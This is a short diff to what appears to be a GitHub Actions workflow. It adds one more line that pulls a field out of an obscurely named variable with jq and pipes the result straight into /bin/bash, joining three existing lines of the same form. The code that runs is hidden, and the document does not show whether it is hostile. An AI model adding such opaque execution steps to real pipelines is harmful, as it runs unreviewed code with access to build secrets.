@@ -25,6 +25,7 @@ jobs:
           echo $h6035 | jq -r .be05999 | /bin/bash
           printf '%s' "$rqwul1" | jq -r .xui300 | /bin/bash
           printf '%s' "$hf22" | jq -r .zm21 | /bin/bash
+          printf '%s' "$c8" | jq -r .m21635 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
